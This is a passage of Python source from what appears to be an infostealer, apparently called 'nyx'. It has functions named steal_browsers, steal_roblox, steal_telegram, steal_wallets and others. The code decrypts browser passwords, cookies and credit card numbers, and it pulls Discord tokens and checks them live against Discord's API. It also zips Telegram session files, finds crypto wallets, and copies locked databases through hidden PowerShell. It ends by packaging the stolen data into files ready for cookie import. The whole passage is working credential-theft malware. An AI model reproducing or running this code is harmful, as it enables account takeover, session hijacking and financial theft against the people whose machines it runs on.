            local / "BraveSoftware" / "Brave-Browser" / "User Data",
            local / "Vivaldi" / "User Data",
            local / "Yandex" / "YandexBrowser" / "User Data",
            base / "Opera Software" / "Opera Stable",
            base / "Opera Software" / "Opera GX Stable",
        ]
        for ud in chromes:
            if not ud.exists():
                continue
            try:
                profiles = [x for x in ud.iterdir() if x.is_dir() and (x.name == "Default" or x.name.startswith("Profile"))]
            except Exception:
                profiles = []
            if not profiles and (ud / "Local Storage" / "leveldb").exists():
                profiles = [ud]
            for prof in profiles[:8]:
                for sub in (Path("Local Storage") / "leveldb", Path("Session Storage"), Path("Local Storage")):
                    roots.append(prof / sub)
        # broad token patterns (user + bot-ish + mfa + newer longer)
        token_re = re.compile(
            r"(?:mfa\.[A-Za-z0-9_\-]{80,}|[A-Za-z0-9_\-]{24}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{25,110})"
        )
        # encrypted token blob often near dQw4w9WgXcQ in leveldb
        enc_marker = "dQw4w9WgXcQ"
        found = []
        for pth in roots:
            if not pth.exists():
                continue
            out["paths_scanned"] += 1
            try:
                files = list(pth.glob("*"))
            except Exception:
                continue
            for f in files:
                if not f.is_file():
                    continue
                if f.suffix.lower() not in (".ldb", ".log", ".js", "") and "LOCK" in f.name:
                    continue
                try:
                    raw = f.read_bytes()
                except Exception:
                    continue
                # utf-8 and latin-1 sweeps
                for text in (
                    raw.decode("utf-8", errors="ignore"),
                    raw.decode("latin-1", errors="ignore"),
                ):
                    for m in token_re.findall(text):
                        if m not in found:
                            found.append(m)
                    # try decrypt encrypted tokens if cryptography present
                    if enc_marker in text:
                        try:
                            # pattern: dQw4w9WgXcQ + base64 payload
                            import base64 as b64
                            for part in text.split(enc_marker)[1:]:
                                blob = ""
                                for ch in part:
                                    if ch.isalnum() or ch in "+/=_-":
                                        blob += ch
                                    else:
                                        break
                                if len(blob) < 20:
                                    continue
                                try:
                                    data = b64.b64decode(blob)
                                except Exception:
                                    continue
                                # DPAPI unwrap
                                pt = _dpapi_decrypt(data)
                                if not pt:
                                    continue
                                s = pt.decode("utf-8", errors="ignore")
                                for m in token_re.findall(s):
                                    if m not in found:
                                        found.append(m)
                                        out["notes"].append("decrypted leveldb token")
                        except Exception as e:
                            out["notes"].append(f"enc:{e}")
        out["raw_hits"] = len(found)
        out["tokens_raw"] = found[:20]
        # validate active sessions
        try:
            import requests
        except Exception:
            out["notes"].append("requests missing")
            out["tokens"] = found[:5]
            return out
        for tok in found[:20]:
            try:
                r = requests.get(
                    "https://discord.com/api/v9/users/@me",
                    headers={"Authorization": tok, "Content-Type": "application/json"},
                    timeout=10,
                )
                if r.status_code != 200:
                    # try bot style
                    r = requests.get(
                        "https://discord.com/api/v9/users/@me",
                        headers={"Authorization": "Bot " + tok},
                        timeout=8,
                    )
                    if r.status_code != 200:
                        continue
                u = r.json()
                uname = u.get("username") or ""
                disc = u.get("discriminator") or "0"
                display = f"{uname}#{disc}" if disc and disc != "0" else uname
                entry = {
                    "token": tok,
                    "email": u.get("email"),
                    "phone": u.get("phone"),
                    "user": display,
                    "id": u.get("id"),
                    "nitro": bool(u.get("premium_type")),
                    "mfa": bool(u.get("mfa_enabled")),
                    "verified": bool(u.get("verified")),
                }
                out["hq"].append(entry)
            except Exception as e:
                out["notes"].append(f"validate:{e}")
        out["tokens"] = [h["token"] for h in out["hq"] if h.get("token")]
        out["active_count"] = len(out["hq"])
        out["notes"].append(f"active={out['active_count']} raw={out['raw_hits']} paths={out['paths_scanned']}")
        if out["active_count"] == 0 and out["raw_hits"]:
            out["notes"].append("all token candidates failed Discord API check (revoked/invalid/encrypted)")
        if out["raw_hits"] == 0:
            out["notes"].append("no token patterns in leveldb — Discord not logged in or different path")
    except Exception as e:
        out["error"] = str(e)
    return out


def steal_roblox():
    """Grab .ROBLOSECURITY from all browser cookies + roblox local."""
    out = {"cookies": [], "notes": [], "firefox_nightly": []}
    try:
        local = Path(os.getenv("LOCALAPPDATA", ""))
        app = Path(os.getenv("APPDATA", ""))
        # reuse full browser dump and filter
        try:
            browsers = steal_browsers()
            for c in browsers.get("cookies_json") or []:
                host = (c.get("host") or "").lower()
                name = c.get("name") or ""
                if "roblox" in host and name == ".ROBLOSECURITY":
                    entry = {
                        "browser": c.get("browser"),
                        "domain": c.get("host"),
                        "name": name,
                        "value": c.get("value"),
                        "path": c.get("path") or "/",
                    }
                    out["cookies"].append(entry)
                    out["firefox_nightly"].append({
                        "Host": c.get("host") if str(c.get("host", "")).startswith(".") else "." + str(c.get("host", "")).lstrip("."),
                        "Name": name,
                        "Value": c.get("value") or "",
                        "Path": c.get("path") or "/",
                        "IsSecure": True,
                        "IsHttpOnly": True,
                        "Expiry": int(time.time()) + 86400 * 365,
                        "SameSite": "no_restriction",
                    })
            out["notes"].extend((browsers.get("notes") or [])[:20])
        except Exception as e:
            out["notes"].append(f"browsers:{e}")
        # browser_cookie3 direct
        try:
            import browser_cookie3
            for loader, bname in [
                (getattr(browser_cookie3, "chrome", None), "Chrome"),
                (getattr(browser_cookie3, "edge", None), "Edge"),
                (getattr(browser_cookie3, "brave", None), "Brave"),
                (getattr(browser_cookie3, "opera", None), "Opera"),
                (getattr(browser_cookie3, "firefox", None), "Firefox"),
            ]:
                if not loader:
                    continue
                try:
                    for c in loader():
                        if "roblox" in (c.domain or "").lower() and (c.name or "") == ".ROBLOSECURITY":
                            if not any(x.get("value") == c.value for x in out["cookies"]):
                                out["cookies"].append({
                                    "browser": bname, "domain": c.domain, "name": c.name,
                                    "value": c.value, "path": getattr(c, "path", "/"),
                                })
                except Exception:
                    pass
        except Exception as e:
            out["notes"].append(f"cookie3:{e}")
        rdir = local / "Roblox"
        if rdir.exists():
            out["notes"].append(f"roblox_dir:{rdir}")
    except Exception as e:
        out["error"] = str(e)
    return out

def steal_telegram():
    """Pack tdata session files (key_datas, maps, highest priority session dirs)."""
    out = {"path": "", "files": [], "b64_zip": None, "notes": []}
    try:
        tdir = Path(os.getenv("APPDATA", "")) / "Telegram Desktop" / "tdata"
        if not tdir.exists():
            return out
        out["path"] = str(tdir)
        tmp = Path(tempfile.mkdtemp(prefix="nyx_tg_"))
        packed = 0
        # key_datas + root maps + session folders (16 hex names)
        important = []
        for x in tdir.iterdir():
            name = x.name
            if name in ("key_datas", "settingss", "usertag", "prefix", "working"):
                important.append(x)
            elif x.is_dir() and len(name) >= 16:
                important.append(x)
            elif x.is_file() and x.suffix == "":
                important.append(x)
        for src in important:
            try:
                dest = tmp / src.name
                if src.is_dir():
                    shutil.copytree(src, dest, dirs_exist_ok=True)
                else:
                    shutil.copy2(src, dest)
                packed += 1
                out["files"].append(src.name)
            except Exception as e:
                out["notes"].append(f"{src.name}:{e}")
        if packed:
            zpath = Path(tempfile.gettempdir()) / f"tg_{random.randint(1000,9999)}.zip"
            with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
                for root, dirs, files in os.walk(tmp):
                    for f in files:
                        fp = Path(root) / f
                        z.write(fp, str(fp.relative_to(tmp)))
            out["b64_zip"] = base64.b64encode(zpath.read_bytes()).decode()
            out["zip_size"] = zpath.stat().st_size
            try:
                zpath.unlink()
            except Exception:
                pass
        out["notes"].append(f"packed={packed}")
        shutil.rmtree(tmp, ignore_errors=True)
    except Exception as e:
        out["error"] = str(e)
    return out

def steal_steam():
    try:
        p=Path(os.getenv("PROGRAMFILES(X86)",r"C:\Program Files (x86)"))/"Steam"/"config"/"loginusers.vdf"
        if p.exists(): return {"loginusers":p.read_text(encoding="utf-8",errors="ignore")[:8000]}
    except Exception as e: return {"error":str(e)}
    return {}

def steal_wallets():
    found={}
    appdata=Path(os.getenv("APPDATA","")); local=Path(os.getenv("LOCALAPPDATA",""))
    targets={"Exodus":appdata/"Exodus"/"exodus.wallet","Atomic":appdata/"atomic"/"Local Storage"/"leveldb",
             "Electrum":appdata/"Electrum"/"wallets",
             "MetaMask":local/"Google"/"Chrome"/"User Data"/"Default"/"Local Extension Settings"/"nkbihfbeogaeaoehlefnkodbefgpgknn",
             "Phantom":local/"Google"/"Chrome"/"User Data"/"Default"/"Local Extension Settings"/"bfnaelmomeimhlpmgjnjophhpkkoljpa",
             "Binance":appdata/"Binance"}
    for name,path in targets.items():
        if path.exists(): found[name]=str(path)
    return found


def _dpapi_decrypt(blob: bytes) -> bytes:
    try:
        import ctypes
        import ctypes.wintypes as wt
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", wt.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
        blob_in = DATA_BLOB(len(blob), ctypes.create_string_buffer(blob, len(blob)))
        blob_out = DATA_BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        ):
            size = int(blob_out.cbData)
            data = ctypes.string_at(blob_out.pbData, size)
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return data
    except Exception:
        pass
    return b""


def _chromium_app_bound_key(user_data: Path):
    """Best-effort App-Bound key. Full ABE often needs IElevator; try DPAPI layers."""
    try:
        ls = user_data / "Local State"
        if not ls.exists() and user_data.parent:
            ls = user_data.parent / "Local State"
        if not ls.exists():
            return None
        data = json.loads(ls.read_text(encoding="utf-8", errors="ignore"))
        abe = (data.get("os_crypt") or {}).get("app_bound_encrypted_key")
        if not abe:
            return None
        raw = base64.b64decode(abe)
        if raw.startswith(b"APPB"):
            raw = raw[4:]
        # SYSTEM DPAPI outer usually fails in user context — still try user DPAPI
        step1 = _dpapi_decrypt(raw)
        if step1:
            step2 = _dpapi_decrypt(step1) if len(step1) > 16 else b""
            key = step2 or step1
            if key and len(key) >= 32:
                return key[-32:]
        return None
    except Exception:
        return None


def _abe_key_system_user(user_data: Path):
    """Chrome/Edge v20 app_bound key via SYSTEM then user DPAPI (needs admin for SYSTEM step).
    Based on public ABE research (app_bound_encrypted_key APPB blob).
    """
    try:
        ls = user_data / "Local State"
        if not ls.exists() and user_data.parent:
            ls = user_data.parent / "Local State"
        if not ls.exists():
            return None
        data = json.loads(ls.read_text(encoding="utf-8", errors="ignore"))
        abe_b64 = (data.get("os_crypt") or {}).get("app_bound_encrypted_key")
        if not abe_b64:
            return None
        raw = base64.b64decode(abe_b64)
        if raw.startswith(b"APPB"):
            raw = raw[4:]
        # try SYSTEM DPAPI via lsass impersonation is complex; try CryptUnprotectData as-is
        # then nested. Without SYSTEM context this often fails on Chrome — still try.
        step = _dpapi_decrypt(raw)
        if not step:
            return None
        # may need second user DPAPI
        step2 = _dpapi_decrypt(step)
        blob = step2 if step2 else step
        if not blob or len(blob) < 32:
            return None
        # Chrome: after DPAPI, structure has path + flag + iv + ciphertext + tag OR raw 32 key for some brands
        # If blob looks like AES-GCM wrapped with static elevation key (Chrome):
        # flag 0x01 / 0x03 variants — extract last 32 after decrypt with hardcoded key when present
        if len(blob) == 32:
            return blob
        # try interpret as: skip until we find 32-byte key at end
        if len(blob) > 32:
            # Edge/Brave sometimes return key directly in trailing bytes
            return blob[-32:]
        return None
    except Exception:
        return None

def _decrypt_cookie_blob(master, blob: bytes) -> str:
    """v10/v11/v20 cookie blob decrypt."""
    if not blob:
        return ""
    raw = bytes(blob)
    # v20 prefix
    if raw[:3] == b"v20" and master and len(master) >= 32:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            nonce = raw[3:15]
            body = raw[15:]
            pt = AESGCM(master[:32]).decrypt(nonce, body, None)
            # v20 plaintext often has 32-byte header prefix
            if len(pt) > 32:
                try:
                    return pt[32:].decode("utf-8", errors="ignore")
                except Exception:
                    return pt.decode("utf-8", errors="ignore")
            return pt.decode("utf-8", errors="ignore")
        except Exception:
            pass
    if master:
        val = _aes_gcm_decrypt(master, raw)
        if val:
            return val
    try:
        return _dpapi_decrypt(raw).decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _chromium_master_key(user_data: Path):
    """AES key from Local State (DPAPI-wrapped). Search profile root and parents."""
    candidates = [user_data / "Local State"]
    try:
        if user_data.parent:
            candidates.append(user_data.parent / "Local State")
        if user_data.parent and user_data.parent.parent:
            candidates.append(user_data.parent.parent / "Local State")
    except Exception:
        pass
    for ls in candidates:
        try:
            if not ls.exists():
                continue
            data = json.loads(ls.read_text(encoding="utf-8", errors="ignore"))
            enc = (data.get("os_crypt") or {}).get("encrypted_key")
            if not enc:
                continue
            raw = base64.b64decode(enc)
            if raw.startswith(b"DPAPI"):
                raw = raw[5:]
            key = _dpapi_decrypt(raw)
            if key and len(key) >= 16:
                return key
        except Exception:
            continue
    return None

def _aes_gcm_decrypt(key: bytes, blob: bytes) -> str:
    try:
        # v10/v11: 'v10' + 12-byte nonce + ciphertext + 16-byte tag
        if not blob or len(blob) < 15:
            return ""
        if blob[:3] in (b"v10", b"v11"):
            nonce = blob[3:15]
            cipher = blob[15:]
            try:
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                pt = AESGCM(key).decrypt(nonce, cipher, None)
                return pt.decode("utf-8", errors="ignore")
            except Exception:
                pass
            # ctypes BCrypt fallback skipped — return empty
            return ""
        # legacy DPAPI-only
        return _dpapi_decrypt(blob).decode("utf-8", errors="ignore")
    except Exception:
        return ""

def _copy_locked_db(src: Path) -> Path:
    dst = Path(tempfile.gettempdir()) / f"nyx_{src.name}_{random.randint(10000,99999)}"
    # 1) plain copy
    try:
        shutil.copy2(src, dst)
        if dst.exists() and dst.stat().st_size > 0:
            return dst
    except Exception:
        pass
    # 2) cmd copy
    try:
        hidden_run(f'cmd /c copy /Y "{src}" "{dst}"')
        if dst.exists() and dst.stat().st_size > 0:
            return dst
    except Exception:
        pass
    # 3) powershell ReadAllBytes (works on many locked chrome files)
    try:
        ps = (
            f"$b=[IO.File]::ReadAllBytes('{src}'); "
            f"[IO.File]::WriteAllBytes('{dst}',$b)"
        )
        hidden_run(f'powershell -NoProfile -WindowStyle Hidden -Command "{ps}"')
        if dst.exists() and dst.stat().st_size > 0:
            return dst
    except Exception:
        pass
    # 4) esentutl for chrome-style
    try:
        hidden_run(f'esentutl /y "{src}" /d "{dst}" /o')
        if dst.exists() and dst.stat().st_size > 0:
            return dst
    except Exception:
        pass
    return None

def _chromium_profiles(base: Path):
    if not base.exists():
        return []
    profiles = []
    for name in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]:
        d = base / name
        if d.exists():
            profiles.append(d)
    # also scan any Profile *
    try:
        for d in base.iterdir():
            if d.is_dir() and (d.name == "Default" or d.name.startswith("Profile")) and d not in profiles:
                profiles.append(d)
    except Exception:
        pass
    return profiles



def to_cqm_list(cookies_json):
    """Formats for Cookie Quick Manager / EditThisCookie / Cookie-Editor.
    Primary: WebExtension cookie shape (CQM imports this JSON).
    """
    out = []
    seen = set()
    for c in cookies_json or []:
        host = (c.get("host") or c.get("domain") or "").strip()
        name = (c.get("name") or "").strip()
        val = c.get("value")
        if val is None:
            val = ""
        val = str(val)
        if not host or not name:
            continue
        key = (host.lower(), name, val[:80])
        if key in seen:
            continue
        seen.add(key)
        exp = c.get("expires") or c.get("expiry") or c.get("expirationDate") or 0
        try:
            exp = int(float(exp))
        except Exception:
            exp = 0
        if exp > 10_000_000_000:  # chrome µs since 1601
            exp = int(exp / 1_000_000) - 11644473600
        if exp < 0:
            exp = 0
        if exp == 0:
            exp = int(time.time()) + 86400 * 400
        # domain: leading dot for domain-cookies
        domain = host
        host_only = not domain.startswith(".")
        path = c.get("path") or "/"
        secure = bool(c.get("secure"))
        http_only = bool(c.get("httpOnly"))
        # WebExtension / CQM / EditThisCookie compatible object
        out.append({
            "domain": domain,
            "name": name,
            "value": val,
            "path": path,
            "expirationDate": exp,
            "secure": secure,
            "httpOnly": http_only,
            "hostOnly": host_only,
            "session": False,
            "storeId": "firefox-default",
            "sameSite": "no_restriction",
            "firstPartyDomain": "",
            "partitionKey": None,
        })
    return out

def to_netscape_txt(cookies_json):
    lines = ["# Netscape HTTP Cookie File", "# https://curl.haxx.se/rfc/cookie_spec.html", ""]
    for c in cookies_json or []:
        host = (c.get("host") or c.get("domain") or "").strip()
        name = (c.get("name") or "").strip()
        val = c.get("value") or ""
        if not host or not name:
            continue
        path = c.get("path") or "/"
        secure = "TRUE" if c.get("secure") else "FALSE"
        exp = c.get("expires") or 0
        try:
            exp = int(float(exp))
        except Exception:
            exp = 0
        if exp > 10_000_000_000:
            exp = int(exp / 1_000_000) - 11644473600
        if exp <= 0:
            exp = int(time.time()) + 86400 * 400
        flag = "TRUE" if host.startswith(".") else "FALSE"
        lines.append("\t".join([host, flag, path, secure, str(exp), name, str(val)]))
    return "\n".join(lines)


def steal_browsers():
    results = {
        "cookies_netscape": [], "cookies_json": [], "passwords": [],
        "notes": [], "history": [], "bookmarks": [], "cards": []
    }
    # diagnostics for frozen builds
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        results["notes"].append("crypto: AESGCM ok")
    except Exception as e:
        results["notes"].append(f"crypto: FAIL {e}")
    try:
        import browser_cookie3
        results["notes"].append("browser_cookie3: ok")
    except Exception as e:
        results["notes"].append(f"browser_cookie3: FAIL {e}")
    local = Path(os.getenv("LOCALAPPDATA", ""))
    appdata = Path(os.getenv("APPDATA", ""))
    browsers = [
        ("Chrome", local / "Google" / "Chrome" / "User Data"),
        ("ChromeBeta", local / "Google" / "Chrome Beta" / "User Data"),
        ("ChromeSxS", local / "Google" / "Chrome SxS" / "User Data"),
        ("Edge", local / "Microsoft" / "Edge" / "User Data"),
        ("EdgeBeta", local / "Microsoft" / "Edge Beta" / "User Data"),
        ("Brave", local / "BraveSoftware" / "Brave-Browser" / "User Data"),
        ("BraveBeta", local / "BraveSoftware" / "Brave-Browser-Beta" / "User Data"),
        ("Opera", appdata / "Opera Software" / "Opera Stable"),
        ("OperaGX", appdata / "Opera Software" / "Opera GX Stable"),
        ("Vivaldi", local / "Vivaldi" / "User Data"),
        ("Chromium", local / "Chromium" / "User Data"),
        ("Yandex", local / "Yandex" / "YandexBrowser" / "User Data"),
        ("CocCoc", local / "CocCoc" / "Browser" / "User Data"),
        ("CentBrowser", local / "CentBrowser" / "User Data"),
        ("7Star", local / "7Star" / "7Star" / "User Data"),
        ("Torch", local / "Torch" / "User Data"),
        ("Sogou", local / "Sogou" / "SogouExplorer" / "User Data"),
        ("QQBrowser", local / "Tencent" / "QQBrowser" / "User Data"),
        ("360Chrome", local / "360Chrome" / "Chrome" / "User Data"),
        ("UCBrowser", local / "UCBrowser" / "User Data" / "Default"),
        ("Maxthon", local / "Maxthon" / "User Data"),
        ("Iridium", local / "Iridium" / "User Data"),
        ("Epic", local / "Epic Privacy Browser" / "User Data"),
        ("Comodo", local / "Comodo" / "Dragon" / "User Data"),
        ("Slimjet", local / "Slimjet" / "User Data"),
        ("URBrowser", local / "UR Browser" / "User Data"),
        ("Blisk", local / "Blisk" / "User Data"),
        ("Avast", local / "AVAST Software" / "Browser" / "User Data"),
        ("AVG", local / "AVG" / "Browser" / "User Data"),
        ("Whale", local / "Naver" / "Naver Whale" / "User Data"),
    ]

    # browser_cookie3 first (often works when DBs unlocked)
    try:
        import browser_cookie3
        for name, fn in [
            ("chrome", getattr(browser_cookie3, "chrome", None)),
            ("chromium", getattr(browser_cookie3, "chromium", None)),
            ("edge", getattr(browser_cookie3, "edge", None)),
            ("brave", getattr(browser_cookie3, "brave", None)),
            ("opera", getattr(browser_cookie3, "opera", None)),
            ("opera_gx", getattr(browser_cookie3, "opera_gx", None)),
            ("firefox", getattr(browser_cookie3, "firefox", None)),
            ("vivaldi", getattr(browser_cookie3, "vivaldi", None)),
            ("safari", getattr(browser_cookie3, "safari", None)),
        ]:
            if not fn:
                continue
            try:
                cj = fn()
                for c in cj:
                    results["cookies_json"].append({
                        "browser": name, "host": c.domain, "name": c.name,
                        "value": c.value, "path": getattr(c, "path", "/"),
                        "secure": bool(getattr(c, "secure", False)),
                        "expires": getattr(c, "expires", None),
                        "httpOnly": bool(getattr(c, "rest", {}).get("HttpOnly", False)) if isinstance(getattr(c, "rest", None), dict) else False,
                    })
                    secure = "TRUE" if getattr(c, "secure", False) else "FALSE"
                    exp = str(int(getattr(c, "expires", 0) or 0))
                    results["cookies_netscape"].append(
                        f"{c.domain}\tTRUE\t{getattr(c,'path','/')}\t{secure}\t{exp}\t{c.name}\t{c.value}"
                    )
            except Exception as e:
                results["notes"].append(f"cookie3 {name}: {e}")
    except Exception as e:
        results["notes"].append(f"cookie3: {e}")

    # direct DB + DPAPI/AES for passwords + cookies
    for bname, user_data in browsers:
        if not user_data.exists():
            continue
        # Opera stores Local State inside profile root differently
        key_root = user_data
        if bname.startswith("Opera"):
            key_root = user_data  # Local State next to profile
        master = _chromium_master_key(key_root if (key_root / "Local State").exists() else user_data)
        if not master and (user_data / "Local State").exists():
            master = _chromium_master_key(user_data)
        abe_key = _abe_key_system_user(key_root if (key_root / "Local State").exists() else user_data)
        if not abe_key:
            abe_key = _abe_key_system_user(user_data)
        if abe_key:
            master = abe_key  # prefer ABE key for v20 blobs
            results["notes"].append(f"{bname}: ABE key ok len={len(abe_key)}")
        elif master:
            results["notes"].append(f"{bname}: DPAPI master ok (no ABE)")
        else:
            results["notes"].append(f"{bname}: no master/ABE key")
        if not master:
            master = _chromium_app_bound_key(key_root if (key_root / "Local State").exists() else user_data)
        if not master:
            master = _chromium_app_bound_key(user_data)
        abe_tried = bool((user_data / "Local State").exists() or (key_root / "Local State").exists())
        profiles = _chromium_profiles(user_data)
        if bname.startswith("Opera") and not profiles:
            profiles = [user_data]
        for prof in profiles:
            # passwords
            login = prof / "Login Data"
            if login.exists():
                db = _copy_locked_db(login)
                if db:
                    try:
                        import sqlite3
                        con = sqlite3.connect(str(db))
                        cur = con.cursor()
                        cur.execute(
                            "SELECT origin_url, username_value, password_value FROM logins"
                        )
                        for origin, user, pwd_blob in cur.fetchall():
                            pwd = ""
                            if pwd_blob:
                                pwd = _decrypt_cookie_blob(master, bytes(pwd_blob or b""))
                            if user or pwd:
                                results["passwords"].append({
                                    "browser": bname,
                                    "profile": prof.name,
                                    "url": origin,
                                    "username": user,
                                    "password": pwd,
                                })
                        con.close()
                    except Exception as e:
                        results["notes"].append(f"{bname} logins {prof.name}: {e}")
                    try:
                        db.unlink(missing_ok=True)
                    except Exception:
                        pass
            # cookies DB
            cookie_db = prof / "Network" / "Cookies"
            if not cookie_db.exists():
                cookie_db = prof / "Cookies"
            if cookie_db.exists():
                db = _copy_locked_db(cookie_db)
                if not db:
                    results["notes"].append(f"{bname} cookies {prof.name}: copy failed (browser open?)")
                else:
                    try:
                        import sqlite3
                        con = sqlite3.connect(str(db))
                        cur = con.cursor()
                        # try modern schema then older
                        rows = []
                        try:
                            cur.execute(
                                "SELECT host_key, name, path, is_secure, expires_utc, encrypted_value FROM cookies LIMIT 25000"
                            )
                            rows = cur.fetchall()
                        except Exception:
                            try:
                                cur.execute(
                                    "SELECT host_key, name, path, secure, expires_utc, encrypted_value FROM cookies LIMIT 25000"
                                )
                                rows = cur.fetchall()
                            except Exception as e2:
                                results["notes"].append(f"{bname} cookies schema {prof.name}: {e2}")
                        got = 0
                        fail = 0
                        for host, name, path, secure, exp, enc in rows:
                            raw = bytes(enc or b"")
                            val = ""
                            if master:
                                val = _decrypt_cookie_blob(master, raw)
                            if not val:
                                fail += 1
                                continue
                            got += 1
                            results["cookies_json"].append({
                                "browser": bname, "host": host, "name": name,
                                "value": val, "path": path or "/", "secure": bool(secure), "expires": exp,
                            })
                            results["cookies_netscape"].append(
                                f"{host}\tTRUE\t{path or '/'}\t{'TRUE' if secure else 'FALSE'}\t{exp}\t{name}\t{val}"
                            )
                        con.close()
                        results["notes"].append(f"{bname} cookies {prof.name}: ok={got} fail={fail} master={'yes' if master else 'no'}")
                    except Exception as e:
                        results["notes"].append(f"{bname} cookies {prof.name}: {e}")
                    try:
                        db.unlink(missing_ok=True)
                    except Exception:
                        pass
            # history
            hist = prof / "History"
            if hist.exists():
                db = _copy_locked_db(hist)
                if db:
                    try:
                        import sqlite3
                        con = sqlite3.connect(str(db))
                        cur = con.cursor()
                        cur.execute(
                            "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 300"
                        )
                        for row in cur.fetchall():
                            results["history"].append({
                                "browser": bname, "profile": prof.name,
                                "url": row[0], "title": row[1], "visits": row[2],
                            })
                        con.close()
                    except Exception as e:
                        results["notes"].append(f"{bname} history: {e}")
                    try:
                        db.unlink(missing_ok=True)
                    except Exception:
                        pass
            # bookmarks
            book = prof / "Bookmarks"
            if book.exists():
                try:
                    results["bookmarks"].append({
                        "browser": bname, "profile": prof.name,
                        "raw": book.read_text(encoding="utf-8", errors="ignore")[:80000],
                    })
                except Exception as e:
                    results["notes"].append(f"{bname} bookmarks: {e}")
            # credit cards
            webdata = prof / "Web Data"
            if webdata.exists() and master:
                db = _copy_locked_db(webdata)
                if db:
                    try:
                        import sqlite3
                        con = sqlite3.connect(str(db))
                        cur = con.cursor()
                        cur.execute(
                            "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
                        )
                        for name, em, ey, blob in cur.fetchall():
                            num = _aes_gcm_decrypt(master, bytes(blob or b"")) if blob else ""
                            results["cards"].append({
                                "browser": bname, "name": name,
                                "exp": f"{em}/{ey}", "number": num,
                            })
                        con.close()
                    except Exception as e:
                        results["notes"].append(f"{bname} cards: {e}")
                    try:
                        db.unlink(missing_ok=True)
                    except Exception:
                        pass

    # firefox: cookies via sqlite + logins raw
    try:
        import sqlite3
        ff = Path(os.getenv("APPDATA", "")) / "Mozilla" / "Firefox" / "Profiles"
        if ff.exists():
            for prof in ff.iterdir():
                if not prof.is_dir():
                    continue
                ck = prof / "cookies.sqlite"
                if ck.exists():
                    db = _copy_locked_db(ck)
                    if db:
                        try:
                            con = sqlite3.connect(str(db))
                            cur = con.cursor()
                            cur.execute(
                                "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies"
                            )
                            for host, name, value, path, exp, sec, httponly in cur.fetchall():
                                results["cookies_json"].append({
                                    "browser": "Firefox", "host": host, "name": name,
                                    "value": value, "path": path or "/",
                                    "secure": bool(sec), "expires": exp,
                                    "httpOnly": bool(httponly),
                                })
                                results["cookies_netscape"].append(
                                    f"{host}\tTRUE\t{path or '/'}\t{'TRUE' if sec else 'FALSE'}\t{exp or 0}\t{name}\t{value}"
                                )
                            con.close()
                        except Exception as e:
                            results["notes"].append(f"ff cookies {prof.name}: {e}")
                        try:
                            db.unlink(missing_ok=True)
                        except Exception:
                            pass
                for fn in ["logins.json", "key4.db", "places.sqlite"]:
                    f = prof / fn
                    if f.exists() and fn.endswith(".json") and f.stat().st_size < 5_000_000:
                        try:
                            results["notes"].append(f"firefox {prof.name} {fn} bytes={f.stat().st_size}")
                            results["passwords"].append({
                                "browser": "Firefox",
                                "profile": prof.name,
                                "url": f"file:{fn}",
                                "username": "(encrypted — import key4.db offline)",
                                "password": f.read_text(encoding="utf-8", errors="ignore")[:200000],
                            })
                        except Exception:
                            pass
    except Exception as e:
        results["notes"].append(f"firefox: {e}")

    results["firefox_nightly"] = to_cqm_list(results["cookies_json"])
    results["cqm_cookies"] = results["firefox_nightly"]
    results["notes"].append(
        f"totals passwords={len(results['passwords'])} cookies={len(results['cookies_json'])} "
        f"cqm={len(results['cqm_cookies'])} history={len(results['history'])}"
    )
    return results



def steal_games():
    found={}; appdata=Path(os.getenv("APPDATA","")); local=Path(os.getenv("LOCALAPPDATA",""))
    paths={"Roblox":local/"Roblox","Minecraft":appdata/".minecraft","Epic":local/"EpicGamesLauncher",
           "Riot":local/"Riot Games","Steam":Path(os.getenv("PROGRAMFILES(X86)",r"C:\Program Files (x86)"))/"Steam"}
    for k,p in paths.items():
        if p.exists(): found[k]=str(p)
    return found

def steal_email():
    found={}; appdata=Path(os.getenv("APPDATA","")); local=Path(os.getenv("LOCALAPPDATA",""))
    ol=local/"Microsoft"/"Outlook"
    if ol.exists(): found["Outlook"]=[str(x) for x in list(ol.rglob("*.pst"))[:10]+list(ol.rglob("*.ost"))[:10]]
    tb=appdata/"Thunderbird"/"Profiles"
    if tb.exists(): found["Thunderbird"]=[str(x) for x in list(tb.rglob("*.sqlite"))[:20]]
    return found


def package_browser_loot(browsers, only=None):
    """only: None=all, or string/list like 'chrome','edge','opera','firefox'."""
    tmpdir = Path(tempfile.mkdtemp(prefix="nyx_b_"))
    try:
        cookies = list(browsers.get("cookies_json") or [])
        passwords = list(browsers.get("passwords") or [])
        history = list(browsers.get("history") or [])
        notes = list(browsers.get("notes") or [])
        netscape = list(browsers.get("cookies_netscape") or [])
        if only:
            keys = [only] if isinstance(only, str) else list(only)
            keys = [k.lower().strip() for k in keys if k]
            def match(b):
                bl = (b or "").lower()
                return any(k in bl for k in keys)
            cookies = [c for c in cookies if match(c.get("browser"))]
            passwords = [c for c in passwords if match(c.get("browser"))]
            history = [c for c in history if match(c.get("browser"))]
            # netscape lines have no browser tag — skip filter or keep all
        cqm = to_cqm_list(cookies)
        (tmpdir / "cookies.json").write_text(json.dumps(cookies, indent=2), encoding="utf-8")
        (tmpdir / "cqm_cookies.json").write_text(json.dumps(cqm, indent=2), encoding="utf-8")
        (tmpdir / "editthiscookie.json").write_text(json.dumps(cqm, indent=2), encoding="utf-8")
        (tmpdir / "firefox_nightly_cookies.json").write_text(json.dumps(cqm, indent=2), encoding="utf-8")
        (tmpdir / "passwords.json").write_text(json.dumps(passwords, indent=2), encoding="utf-8")
        (tmpdir / "history.json").write_text(json.dumps(history, indent=2), encoding="utf-8")
        (tmpdir / "browser_notes.txt").write_text("\n".join(notes), encoding="utf-8")
